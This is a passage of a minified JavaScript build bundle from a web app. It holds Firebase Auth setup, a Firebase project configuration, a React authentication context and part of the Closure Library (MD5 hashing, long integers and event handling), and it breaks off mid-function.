 * limitations under the License.
 */const dV=5*60,pV=m2("authIdTokenMaxAge")||dV;let NI=null;const gV=n=>async e=>{const t=e&&await e.getIdTokenResult(),r=t&&(new Date().getTime()-Date.parse(t.issuedAtTime))/1e3;if(r&&r>pV)return;const i=t==null?void 0:t.token;NI!==i&&(NI=i,await fetch(n,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function tk(n=v2()){const e=Sv(n,"auth");if(e.isInitialized())return e.getImmediate();const t=j8(n,{popupRedirectResolver:cV,persistence:[_j,lj,G2]}),r=m2("authTokenSyncURL");if(r&&typeof isSecureContext=="boolean"&&isSecureContext){const s=new URL(r,location.origin);if(location.origin===s.origin){const o=gV(s.toString());rj(t,o,()=>o(t.currentUser)),nj(t,a=>o(a))}}const i=p2("auth");return i&&F8(t,`http://${i}`),t}function mV(){var n,e;return(e=(n=document.getElementsByTagName("head"))===null||n===void 0?void 0:n[0])!==null&&e!==void 0?e:document}M8({loadJS(n){return new Promise((e,t)=>{const r=document.createElement("script");r.setAttribute("src",n),r.onload=e,r.onerror=i=>{const s=ki("internal-error");s.customData=i,t(s)},r.type="text/javascript",r.charset="UTF-8",mV().appendChild(r)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});fV("Browser");var yV="firebase",wV="11.6.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */lo(yV,wV,"app");const vV={apiKey:"AIzaSyCYOFhmThtA_5F9h67lGPLXuO0ZZixy29o",authDomain:"mage-trump-token.firebaseapp.com",databaseURL:"https://mage-trump-token-default-rtdb.firebaseio.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.firebasestorage.app",messagingSenderId:"974753040843",appId:"1:974753040843:web:8de9a9f42ac4f24550ce4e"},_V=Hp(vV),Lm=tk(_V),EV=Y.createContext(),IV=({children:n})=>{const[e,t]=Y.useState(null),[r,i]=Y.useState(!0);Y.useEffect(()=>ij(Lm,a=>{t(a),i(!1)}),[]);const s=(a,l)=>tj(Lm,a,l),o=()=>sj(Lm);return Q.jsx(EV.Provider,{value:{user:e,login:s,logout:o},children:!r&&n})},Pv=""+new URL("front-6e9bd7de.png",import.meta.url).href;var PI=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var uo,nk;(function(){var n;/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/function e(L,N){function B(){}B.prototype=N.prototype,L.D=N.prototype,L.prototype=new B,L.prototype.constructor=L,L.C=function(z,$,K){for(var S=Array(arguments.length-2),d=2;d<arguments.length;d++)S[d-2]=arguments[d];return N.prototype[$].apply(z,S)}}function t(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(r,t),r.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(L,N,B){B||(B=0);var z=Array(16);if(typeof N=="string")for(var $=0;16>$;++$)z[$]=N.charCodeAt(B++)|N.charCodeAt(B++)<<8|N.charCodeAt(B++)<<16|N.charCodeAt(B++)<<24;else for($=0;16>$;++$)z[$]=N[B++]|N[B++]<<8|N[B++]<<16|N[B++]<<24;N=L.g[0],B=L.g[1],$=L.g[2];var K=L.g[3],S=N+(K^B&($^K))+z[0]+3614090360&4294967295;N=B+(S<<7&4294967295|S>>>25),S=K+($^N&(B^$))+z[1]+3905402710&4294967295,K=N+(S<<12&4294967295|S>>>20),S=$+(B^K&(N^B))+z[2]+606105819&4294967295,$=K+(S<<17&4294967295|S>>>15),S=B+(N^$&(K^N))+z[3]+3250441966&4294967295,B=$+(S<<22&4294967295|S>>>10),S=N+(K^B&($^K))+z[4]+4118548399&4294967295,N=B+(S<<7&4294967295|S>>>25),S=K+($^N&(B^$))+z[5]+1200080426&4294967295,K=N+(S<<12&4294967295|S>>>20),S=$+(B^K&(N^B))+z[6]+2821735955&4294967295,$=K+(S<<17&4294967295|S>>>15),S=B+(N^$&(K^N))+z[7]+4249261313&4294967295,B=$+(S<<22&4294967295|S>>>10),S=N+(K^B&($^K))+z[8]+1770035416&4294967295,N=B+(S<<7&4294967295|S>>>25),S=K+($^N&(B^$))+z[9]+2336552879&4294967295,K=N+(S<<12&4294967295|S>>>20),S=$+(B^K&(N^B))+z[10]+4294925233&4294967295,$=K+(S<<17&4294967295|S>>>15),S=B+(N^$&(K^N))+z[11]+2304563134&4294967295,B=$+(S<<22&4294967295|S>>>10),S=N+(K^B&($^K))+z[12]+1804603682&4294967295,N=B+(S<<7&4294967295|S>>>25),S=K+($^N&(B^$))+z[13]+4254626195&4294967295,K=N+(S<<12&4294967295|S>>>20),S=$+(B^K&(N^B))+z[14]+2792965006&4294967295,$=K+(S<<17&4294967295|S>>>15),S=B+(N^$&(K^N))+z[15]+1236535329&4294967295,B=$+(S<<22&4294967295|S>>>10),S=N+($^K&(B^$))+z[1]+4129170786&4294967295,N=B+(S<<5&4294967295|S>>>27),S=K+(B^$&(N^B))+z[6]+3225465664&4294967295,K=N+(S<<9&4294967295|S>>>23),S=$+(N^B&(K^N))+z[11]+643717713&4294967295,$=K+(S<<14&4294967295|S>>>18),S=B+(K^N&($^K))+z[0]+3921069994&4294967295,B=$+(S<<20&4294967295|S>>>12),S=N+($^K&(B^$))+z[5]+3593408605&4294967295,N=B+(S<<5&4294967295|S>>>27),S=K+(B^$&(N^B))+z[10]+38016083&4294967295,K=N+(S<<9&4294967295|S>>>23),S=$+(N^B&(K^N))+z[15]+3634488961&4294967295,$=K+(S<<14&4294967295|S>>>18),S=B+(K^N&($^K))+z[4]+3889429448&4294967295,B=$+(S<<20&4294967295|S>>>12),S=N+($^K&(B^$))+z[9]+568446438&4294967295,N=B+(S<<5&4294967295|S>>>27),S=K+(B^$&(N^B))+z[14]+3275163606&4294967295,K=N+(S<<9&4294967295|S>>>23),S=$+(N^B&(K^N))+z[3]+4107603335&4294967295,$=K+(S<<14&4294967295|S>>>18),S=B+(K^N&($^K))+z[8]+1163531501&4294967295,B=$+(S<<20&4294967295|S>>>12),S=N+($^K&(B^$))+z[13]+2850285829&4294967295,N=B+(S<<5&4294967295|S>>>27),S=K+(B^$&(N^B))+z[2]+4243563512&4294967295,K=N+(S<<9&4294967295|S>>>23),S=$+(N^B&(K^N))+z[7]+1735328473&4294967295,$=K+(S<<14&4294967295|S>>>18),S=B+(K^N&($^K))+z[12]+2368359562&4294967295,B=$+(S<<20&4294967295|S>>>12),S=N+(B^$^K)+z[5]+4294588738&4294967295,N=B+(S<<4&4294967295|S>>>28),S=K+(N^B^$)+z[8]+2272392833&4294967295,K=N+(S<<11&4294967295|S>>>21),S=$+(K^N^B)+z[11]+1839030562&4294967295,$=K+(S<<16&4294967295|S>>>16),S=B+($^K^N)+z[14]+4259657740&4294967295,B=$+(S<<23&4294967295|S>>>9),S=N+(B^$^K)+z[1]+2763975236&4294967295,N=B+(S<<4&4294967295|S>>>28),S=K+(N^B^$)+z[4]+1272893353&4294967295,K=N+(S<<11&4294967295|S>>>21),S=$+(K^N^B)+z[7]+4139469664&4294967295,$=K+(S<<16&4294967295|S>>>16),S=B+($^K^N)+z[10]+3200236656&4294967295,B=$+(S<<23&4294967295|S>>>9),S=N+(B^$^K)+z[13]+681279174&4294967295,N=B+(S<<4&4294967295|S>>>28),S=K+(N^B^$)+z[0]+3936430074&4294967295,K=N+(S<<11&4294967295|S>>>21),S=$+(K^N^B)+z[3]+3572445317&4294967295,$=K+(S<<16&4294967295|S>>>16),S=B+($^K^N)+z[6]+76029189&4294967295,B=$+(S<<23&4294967295|S>>>9),S=N+(B^$^K)+z[9]+3654602809&4294967295,N=B+(S<<4&4294967295|S>>>28),S=K+(N^B^$)+z[12]+3873151461&4294967295,K=N+(S<<11&4294967295|S>>>21),S=$+(K^N^B)+z[15]+530742520&4294967295,$=K+(S<<16&4294967295|S>>>16),S=B+($^K^N)+z[2]+3299628645&4294967295,B=$+(S<<23&4294967295|S>>>9),S=N+($^(B|~K))+z[0]+4096336452&4294967295,N=B+(S<<6&4294967295|S>>>26),S=K+(B^(N|~$))+z[7]+1126891415&4294967295,K=N+(S<<10&4294967295|S>>>22),S=$+(N^(K|~B))+z[14]+2878612391&4294967295,$=K+(S<<15&4294967295|S>>>17),S=B+(K^($|~N))+z[5]+4237533241&4294967295,B=$+(S<<21&4294967295|S>>>11),S=N+($^(B|~K))+z[12]+1700485571&4294967295,N=B+(S<<6&4294967295|S>>>26),S=K+(B^(N|~$))+z[3]+2399980690&4294967295,K=N+(S<<10&4294967295|S>>>22),S=$+(N^(K|~B))+z[10]+4293915773&4294967295,$=K+(S<<15&4294967295|S>>>17),S=B+(K^($|~N))+z[1]+2240044497&4294967295,B=$+(S<<21&4294967295|S>>>11),S=N+($^(B|~K))+z[8]+1873313359&4294967295,N=B+(S<<6&4294967295|S>>>26),S=K+(B^(N|~$))+z[15]+4264355552&4294967295,K=N+(S<<10&4294967295|S>>>22),S=$+(N^(K|~B))+z[6]+2734768916&4294967295,$=K+(S<<15&4294967295|S>>>17),S=B+(K^($|~N))+z[13]+1309151649&4294967295,B=$+(S<<21&4294967295|S>>>11),S=N+($^(B|~K))+z[4]+4149444226&4294967295,N=B+(S<<6&4294967295|S>>>26),S=K+(B^(N|~$))+z[11]+3174756917&4294967295,K=N+(S<<10&4294967295|S>>>22),S=$+(N^(K|~B))+z[2]+718787259&4294967295,$=K+(S<<15&4294967295|S>>>17),S=B+(K^($|~N))+z[9]+3951481745&4294967295,L.g[0]=L.g[0]+N&4294967295,L.g[1]=L.g[1]+($+(S<<21&4294967295|S>>>11))&4294967295,L.g[2]=L.g[2]+$&4294967295,L.g[3]=L.g[3]+K&4294967295}r.prototype.u=function(L,N){N===void 0&&(N=L.length);for(var B=N-this.blockSize,z=this.B,$=this.h,K=0;K<N;){if($==0)for(;K<=B;)i(this,L,K),K+=this.blockSize;if(typeof L=="string"){for(;K<N;)if(z[$++]=L.charCodeAt(K++),$==this.blockSize){i(this,z),$=0;break}}else for(;K<N;)if(z[$++]=L[K++],$==this.blockSize){i(this,z),$=0;break}}this.h=$,this.o+=N},r.prototype.v=function(){var L=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);L[0]=128;for(var N=1;N<L.length-8;++N)L[N]=0;var B=8*this.o;for(N=L.length-8;N<L.length;++N)L[N]=B&255,B/=256;for(this.u(L),L=Array(16),N=B=0;4>N;++N)for(var z=0;32>z;z+=8)L[B++]=this.g[N]>>>z&255;return L};function s(L,N){var B=a;return Object.prototype.hasOwnProperty.call(B,L)?B[L]:B[L]=N(L)}function o(L,N){this.h=N;for(var B=[],z=!0,$=L.length-1;0<=$;$--){var K=L[$]|0;z&&K==N||(B[$]=K,z=!1)}this.g=B}var a={};function l(L){return-128<=L&&128>L?s(L,function(N){return new o([N|0],0>N?-1:0)}):new o([L|0],0>L?-1:0)}function u(L){if(isNaN(L)||!isFinite(L))return f;if(0>L)return I(u(-L));for(var N=[],B=1,z=0;L>=B;z++)N[z]=L/B|0,B*=4294967296;return new o(N,0)}function h(L,N){if(L.length==0)throw Error("number format error: empty string");if(N=N||10,2>N||36<N)throw Error("radix out of range: "+N);if(L.charAt(0)=="-")return I(h(L.substring(1),N));if(0<=L.indexOf("-"))throw Error('number format error: interior "-" character');for(var B=u(Math.pow(N,8)),z=f,$=0;$<L.length;$+=8){var K=Math.min(8,L.length-$),S=parseInt(L.substring($,$+K),N);8>K?(K=u(Math.pow(N,K)),z=z.j(K).add(u(S))):(z=z.j(B),z=z.add(u(S)))}return z}var f=l(0),p=l(1),w=l(16777216);n=o.prototype,n.m=function(){if(k(this))return-I(this).m();for(var L=0,N=1,B=0;B<this.g.length;B++){var z=this.i(B);L+=(0<=z?z:4294967296+z)*N,N*=4294967296}return L},n.toString=function(L){if(L=L||10,2>L||36<L)throw Error("radix out of range: "+L);if(x(this))return"0";if(k(this))return"-"+I(this).toString(L);for(var N=u(Math.pow(L,6)),B=this,z="";;){var $=O(B,N).g;B=A(B,$.j(N));var K=((0<B.g.length?B.g[0]:B.h)>>>0).toString(L);if(B=$,x(B))return K+z;for(;6>K.length;)K="0"+K;z=K+z}},n.i=function(L){return 0>L?0:L<this.g.length?this.g[L]:this.h};function x(L){if(L.h!=0)return!1;for(var N=0;N<L.g.length;N++)if(L.g[N]!=0)return!1;return!0}function k(L){return L.h==-1}n.l=function(L){return L=A(this,L),k(L)?-1:x(L)?0:1};function I(L){for(var N=L.g.length,B=[],z=0;z<N;z++)B[z]=~L.g[z];return new o(B,~L.h).add(p)}n.abs=function(){return k(this)?I(this):this},n.add=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0,$=0;$<=N;$++){var K=z+(this.i($)&65535)+(L.i($)&65535),S=(K>>>16)+(this.i($)>>>16)+(L.i($)>>>16);z=S>>>16,K&=65535,S&=65535,B[$]=S<<16|K}return new o(B,B[B.length-1]&-2147483648?-1:0)};function A(L,N){return L.add(I(N))}n.j=function(L){if(x(this)||x(L))return f;if(k(this))return k(L)?I(this).j(I(L)):I(I(this).j(L));if(k(L))return I(this.j(I(L)));if(0>this.l(w)&&0>L.l(w))return u(this.m()*L.m());for(var N=this.g.length+L.g.length,B=[],z=0;z<2*N;z++)B[z]=0;for(z=0;z<this.g.length;z++)for(var $=0;$<L.g.length;$++){var K=this.i(z)>>>16,S=this.i(z)&65535,d=L.i($)>>>16,_=L.i($)&65535;B[2*z+2*$]+=S*_,b(B,2*z+2*$),B[2*z+2*$+1]+=K*_,b(B,2*z+2*$+1),B[2*z+2*$+1]+=S*d,b(B,2*z+2*$+1),B[2*z+2*$+2]+=K*d,b(B,2*z+2*$+2)}for(z=0;z<N;z++)B[z]=B[2*z+1]<<16|B[2*z];for(z=N;z<2*N;z++)B[z]=0;return new o(B,0)};function b(L,N){for(;(L[N]&65535)!=L[N];)L[N+1]+=L[N]>>>16,L[N]&=65535,N++}function E(L,N){this.g=L,this.h=N}function O(L,N){if(x(N))throw Error("division by zero");if(x(L))return new E(f,f);if(k(L))return N=O(I(L),N),new E(I(N.g),I(N.h));if(k(N))return N=O(L,I(N)),new E(I(N.g),N.h);if(30<L.g.length){if(k(L)||k(N))throw Error("slowDivide_ only works with positive integers.");for(var B=p,z=N;0>=z.l(L);)B=W(B),z=W(z);var $=q(B,1),K=q(z,1);for(z=q(z,2),B=q(B,2);!x(z);){var S=K.add(z);0>=S.l(L)&&($=$.add(B),K=S),z=q(z,1),B=q(B,1)}return N=A(L,$.j(N)),new E($,N)}for($=f;0<=L.l(N);){for(B=Math.max(1,Math.floor(L.m()/N.m())),z=Math.ceil(Math.log(B)/Math.LN2),z=48>=z?1:Math.pow(2,z-48),K=u(B),S=K.j(N);k(S)||0<S.l(L);)B-=z,K=u(B),S=K.j(N);x(K)&&(K=p),$=$.add(K),L=A(L,S)}return new E($,L)}n.A=function(L){return O(this,L).h},n.and=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)&L.i(z);return new o(B,this.h&L.h)},n.or=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)|L.i(z);return new o(B,this.h|L.h)},n.xor=function(L){for(var N=Math.max(this.g.length,L.g.length),B=[],z=0;z<N;z++)B[z]=this.i(z)^L.i(z);return new o(B,this.h^L.h)};function W(L){for(var N=L.g.length+1,B=[],z=0;z<N;z++)B[z]=L.i(z)<<1|L.i(z-1)>>>31;return new o(B,L.h)}function q(L,N){var B=N>>5;N%=32;for(var z=L.g.length-B,$=[],K=0;K<z;K++)$[K]=0<N?L.i(K+B)>>>N|L.i(K+B+1)<<32-N:L.i(K+B);return new o($,L.h)}r.prototype.digest=r.prototype.v,r.prototype.reset=r.prototype.s,r.prototype.update=r.prototype.u,nk=r,o.prototype.add=o.prototype.add,o.prototype.multiply=o.prototype.j,o.prototype.modulo=o.prototype.A,o.prototype.compare=o.prototype.l,o.prototype.toNumber=o.prototype.m,o.prototype.toString=o.prototype.toString,o.prototype.getBits=o.prototype.i,o.fromNumber=u,o.fromString=h,uo=o}).apply(typeof PI<"u"?PI:typeof self<"u"?self:typeof window<"u"?window:{});var gf=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var rk,Zc,ik,Wf,Sy,sk,ok,ak;(function(){var n,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(c,g,T){return c==Array.prototype||c==Object.prototype||(c[g]=T.value),c};function t(c){c=[typeof globalThis=="object"&&globalThis,c,typeof window=="object"&&window,typeof self=="object"&&self,typeof gf=="object"&&gf];for(var g=0;g<c.length;++g){var T=c[g];if(T&&T.Math==Math)return T}throw Error("Cannot find globalThis object")}var r=t(this);function i(c,g){if(g)e:{var T=r;c=c.split(".");for(var U=0;U<c.length-1;U++){var Z=c[U];if(!(Z in T))break e;T=T[Z]}c=c[c.length-1],U=T[c],g=g(U),g!=U&&g!=null&&e(T,c,{configurable:!0,writable:!0,value:g})}}function s(c,g){c instanceof String&&(c+="");var T=0,U=!1,Z={next:function(){if(!U&&T<c.length){var ne=T++;return{value:g(ne,c[ne]),done:!1}}return U=!0,{done:!0,value:void 0}}};return Z[Symbol.iterator]=function(){return Z},Z}i("Array.prototype.values",function(c){return c||function(){return s(this,function(g,T){return T})}});/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/var o=o||{},a=this||self;function l(c){var g=typeof c;return g=g!="object"?g:c?Array.isArray(c)?"array":g:"null",g=="array"||g=="object"&&typeof c.length=="number"}function u(c){var g=typeof c;return g=="object"&&c!=null||g=="function"}function h(c,g,T){return c.call.apply(c.bind,arguments)}function f(c,g,T){if(!c)throw Error();if(2<arguments.length){var U=Array.prototype.slice.call(arguments,2);return function(){var Z=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(Z,U),c.apply(g,Z)}}return function(){return c.apply(g,arguments)}}function p(c,g,T){return p=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?h:f,p.apply(null,arguments)}function w(c,g){var T=Array.prototype.slice.call(arguments,1);return function(){var U=T.slice();return U.push.apply(U,arguments),c.apply(this,U)}}function x(c,g){function T(){}T.prototype=g.prototype,c.aa=g.prototype,c.prototype=new T,c.prototype.constructor=c,c.Qb=function(U,Z,ne){for(var fe=Array(arguments.length-2),wt=2;wt<arguments.length;wt++)fe[wt-2]=arguments[wt];return g.prototype[Z].apply(U,fe)}}function k(c){const g=c.length;if(0<g){const T=Array(g);for(let U=0;U<g;U++)T[U]=c[U];return T}return[]}function I(c,g){for(let T=1;T<arguments.length;T++){const U=arguments[T];if(l(U)){const Z=c.length||0,ne=U.length||0;c.length=Z+ne;for(let fe=0;fe<ne;fe++)c[Z+fe]=U[fe]}else c.push(U)}}class A{constructor(g,T){this.i=g,this.j=T,this.h=0,this.g=null}get(){let g;return 0<this.h?(this.h--,g=this.g,this.g=g.next,g.next=null):g=this.i(),g}}function b(c){return/^[\s\xa0]*$/.test(c)}function E(){var c=a.navigator;return c&&(c=c.userAgent)?c:""}function O(c){return O[" "](c),c}O[" "]=function(){};var W=E().indexOf("Gecko")!=-1&&!(E().toLowerCase().indexOf("webkit")!=-1&&E().indexOf("Edge")==-1)&&!(E().indexOf("Trident")!=-1||E().indexOf("MSIE")!=-1)&&E().indexOf("Edge")==-1;function q(c,g,T){for(const U in c)g.call(T,c[U],U,c)}function L(c,g){for(const T in c)g.call(void 0,c[T],T,c)}function N(c){const g={};for(const T in c)g[T]=c[T];return g}const B="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function z(c,g){let T,U;for(let Z=1;Z<arguments.length;Z++){U=arguments[Z];for(T in U)c[T]=U[T];for(let ne=0;ne<B.length;ne++)T=B[ne],Object.prototype.hasOwnProperty.call(U,T)&&(c[T]=U[T])}}function $(c){var g=1;c=c.split(":");const T=[];for(;0<g&&c.length;)T.push(c.shift()),g--;return c.length&&T.push(c.join(":")),T}function K(c){a.setTimeout(()=>{throw c},0)}function S(){var c=j;let g=null;return c.g&&(g=c.g,c.g=c.g.next,c.g||(c.h=null),g.next=null),g}class d{constructor(){this.h=this.g=null}add(g,T){const U=_.get();U.set(g,T),this.h?this.h.next=U:this.g=U,this.h=U}}var _=new A(()=>new C,c=>c.reset());class C{constructor(){this.next=this.g=this.h=null}set(g,T){this.h=g,this.g=T,this.next=null}reset(){this.next=this.g=this.h=null}}let M,R=!1,j=new d,H=()=>{const c=a.Promise.resolve(void 0);M=()=>{c.then(D)}};var D=()=>{for(var c;c=S();){try{c.h.call(c.g)}catch(T){K(T)}var g=_;g.j(c),100>g.h&&(g.h++,c.next=g.g,g.g=c)}R=!1};function y(){this.s=this.s,this.C=this.C}y.prototype.s=!1,y.prototype.ma=function(){this.s||(this.s=!0,this.N())},y.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function V(c,g){this.type=c,this.g=this.target=g,this.defaultPrevented=!1}V.prototype.h=function(){this.defaultPrevented=!0};var oe=function(){if(!a.addEventListener||!Object.defineProperty)return!1;var c=!1,g=Object.defineProperty({},"passive",{get:function(){c=!0}});try{const T=()=>{};a.addEventListener("test",T,g),a.removeEventListener("test",T,g)}catch{}return c}();function ce(c,g){if(V.call(this,c?c.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,c){var T=this.type=c.type,U=c.changedTouches&&c.changedTouches.length?c.changedTouches[0]:null;if(this.target=c.target||c.srcElement,this.g=g,g=c.relatedTarget){if(W){e:{try{O(g.nodeName);var Z=!0;break e}catch{}Z=!1}Z||(g=null)}}else T=="mouseover"?g=c.fromElement:T=="mouseout"&&(g=c.toElement);this.relatedTarget=g,U?(this.clientX=U.clientX!==void 0?U.clientX:U.pageX,this.clientY=U.clientY!==void 0?U.clientY:U.pageY,this.screenX=U.screenX||0,this.screenY=U.screenY||0):(this.clientX=c.clientX!==void 0?c.clientX:c.pageX,this.clientY=c.clientY!==void 0?c.clientY:c.pageY,this.screenX=c.screenX||0,this.screenY=c.screenY||0),this.button=c.button,this.key=c.key||"",this.ctrlKey=c.ctrlKey,this.altKey=c.altKey,this.shiftKey=c.shiftKey,this.metaKey=c.metaKey,this.pointerId=c.pointerId||0,this.pointerType=typeof c.pointerType=="string"?c.pointerType:he[c.pointerType]||"",this.state=c.state,this.i=c,c.defaultPrevented&&ce.aa.h.call(this)}}x(ce,V);var he={2:"touch",3:"pen",4:"mouse"};ce.prototype.h=function(){ce.aa.h.call(this);var c=this.i;c.preventDefault?c.preventDefault():c.returnValue=!1};var Ce="closure_listenable_"+(1e6*Math.random()|0),Ae=0;function Pe(c,g,T,U,Z){this.listener=c,this.proxy=null,this.src=g,this.type=T,this.capture=!!U,this.ha=Z,this.key=++Ae,this.da=this.fa=!1}function gt(c){c.da=!0,c.listener=null,c.proxy=null,c.src=null,c.ha=null}function je(c){this.src=c,this.g={},this.h=0}je.prototype.add=function(c,g,T,U,Z){var ne=c.toString();c=this.g[ne],c||(c=this.g[ne]=[],this.h++);var fe=Pt(c,g,U,Z);return-1<fe?(g=c[fe],T||(g.fa=!1)):(g=new Pe(g,this.src,ne,!!U,Z),g.fa=T,c.push(g)),g};function Ue(c,g){var T=g.type;if(T in c.g){var U=c.g[T],Z=Array.prototype.indexOf.call(U,g,void 0),ne;(ne=0<=Z)&&Array.prototype.splice.call(U,Z,1),ne&&(gt(g),c.g[T].length==0&&(delete c.g[T],c.h--))}}function Pt(c,g,T,U){for(var Z=0;Z<c.length;++Z){var ne=c[Z];if(!ne.da&&ne.listener==g&&ne.capture==!!T&&ne.ha==U)return Z}return-1}var We="closure_lm_"+(1e6*Math.random()|0),Ke={};function ji(c,g,T,U,Z){if(U&&U.once)return Vi(c,g,T,U,Z);if(Array.isArray(g)){for(var ne=0;ne<g.length;ne++)ji(c,g[ne],T,U,Z);return null}return T=ut(T),c&&c[Ce]?c.K(g,T,u(U)?!!U.capture:!!U,Z):ot(c,g,T,!1,U,Z)}function ot(c,g,T,U,Z,ne){if(!g)throw Error("Invalid event type");var fe=u(Z)?!!Z.capture:!!Z,wt=ct(c);if(wt||(c[We]=wt=new je(c)),T=wt.add(g,T,U,fe,ne),T.proxy)return T;if(U=vt(),T.proxy=U,U.src=c,U.listener=T,c.addEventListener)oe||(Z=fe),Z===void 0&&(Z=!1),c.addEventListener(g.toString(),U,Z);else if(c.attachEvent)c.attachEvent(an(g.toString()),U);else if(c.addListener&&c.removeListener)c.addListener(U);else throw Error("addEventListener and attachEvent are unavailable.");return T}function vt(){function c(T){return g.call(c.src,c.listener,T)}const g=lt;return c}function Vi(c,g,T,U,Z){if(Array.isArray(g)){for(var ne=0;ne<g.length;ne++)Vi(c,g[ne],T,U,Z);return null}return T=ut(T),c&&c[Ce]?c.L(g,T,u(U)?!!U.capture:!!U,Z):ot(c,g,T,!0,U,Z)}function at(c,g,T,U,Z){if(Array.isArray(g))for(var ne=0;ne<g.length;ne++)at(c,g[ne],T,U,Z);else U=u(U)?!!U.capture:!!U,T=ut(T),c&&c[Ce]?(c=c.i,g=String(g).toString(),g in c.g&&(ne=c.g[g],T=Pt(ne,T,U,Z),-1<T&&(gt(ne[T]),Array.prototype.splice.call(ne,T,1),ne.length==0&&(delete c.g[g],c.h--)))):c&&(c=ct(c))&&(g=c.g[g.toString()],c=-1,g&&(c=Pt(g,T,U,Z)),(T=-1<c?g[c]:null)&&Xe(T))}function Xe(c){if(typeof c!="number"&&c&&!c.da){var g=c.src;if(g&&g[Ce])Ue(g.i,c);else{var T=c.type,U=c.proxy;g.removeEventListener?g.removeEventListener(T,U,c.capture):g.detachEvent?g.detachEvent(an(T),U):g.addListener&&g.removeListener&&g.removeListener(U),(T=ct(g))?(Ue(T,c),T.h==0&&(T.src=null,g[We]=null)):gt(c)}}}function an(c){return c in Ke?Ke[c]:Ke[c]="on"+c}function lt(c,g){if(c.da)c=!0;else{g=new ce(g,this);var T=c.listener,U=c.ha||c.src;c.fa&&Xe(c),c=T.call(U,g)}return c}function ct(c){return c=c[We],c instanceof je?c:null}var vn="__closure_events_fn_"+(1e9*Math.random()>>>0);function ut(c){return typeof c=="function"?c:(c[vn]||(c[vn]=function(g){return c.handleEvent(g)}),c[vn])}function P(){y.call(this),this.i=new je(this),this.M=this,this.F=null}x(P,y),P.prototype[Ce]=!0,P.prototype.removeEventListener=function(c,g,T,U){at(this,c,g,T,U)};function m(c,g){var T,U=c.F;if(U)for(T=[];U;U=U.F)T.push(U);if(c=c.M,U=g.type||g,typeof g=="string")g=new V(g,c);else if(g instanceof V)g.target=g.target||c;else{var Z=g;g=new V(U,c),z(g,Z)}if(Z=!0,T)for(var ne=T.length-1;0<=ne;ne--){var fe=g.g=T[ne];Z=v(fe,U,!0,g)&&Z}if(fe=g.g=c,Z=v(fe,U,!0,g)&&Z,Z=v(fe,U,!1,g)&&Z,T)for(ne=0;ne<T.length;ne++)fe=g.g=T[ne],Z=v(fe,U,!1,g)&&Z}P.prototype.N=function(){if(P.aa.N.call(this),this.i){var c=this.i,g;for(g in c.g){for(var T=c.g[g],U=0;U<T.length;U++)gt(T[U]);delete c.g[g],c.h--}}this.F=null},P.prototype.K=function(c,g,T,U){return this.i.add(String(c),g,!1,T,U)},P.prototype.L=function(c,g,T,U){return this.i.add(String(c),g,!0,T,U)};function v(c,g,T,U){if(g=c.i.g[String(g)],!g)return!0;g=g.concat();for(var Z=!0,ne=0;ne<g.length;++ne){var fe=g[ne];if(fe&&!fe.da&&fe.capture==T){var wt=fe.listener,Cn=fe.ha||fe.src;fe.fa&&Ue(c.i,fe),Z=wt.call(Cn,U)!==!1&&Z}}return Z&&!U.defaultPrevented}function F(c,g,T){if(typeof c=="function")T&&(c=p(c,T));else if(c&&typeof c.handleEvent=="function")c=p(c.handleEvent,c);else throw Error("Invalid listener argument");return 2147483647<Number(g)?-1:a.setTimeout(c,g||0)}function G(c){c.g=F(()=>{c.g=null,c.i&&(c.i=!1,G(c))},c.l);const g=c.h;c.h=null,c.m.apply(null,g)}class J extends y{constructor(g,T){super(),this.m=g,this.l=T,this.h=null,this.i=!1,this.g=null}j(g){this.h=arguments,this.g?this.i=!0:G(this)}N(){super.N(),this.g&&(a.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function te(c){y.call(this),this.h=c,this.g={}}x(te,y);var Oe=[];function Le(c){q(c.g,function(g,T){this.g.hasOwnProperty(T)&&Xe(g)},c),c.g={}}te.prototype.N=function(){te.aa.N.call(this),Le(this)},te.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var Re=a.JSON.stringify,mt=a.JSON.parse,ke=class{stringify(c){return a.JSON.stringify(c,void 0)}parse(c){return a.JSON.parse(c,void 0)}};function 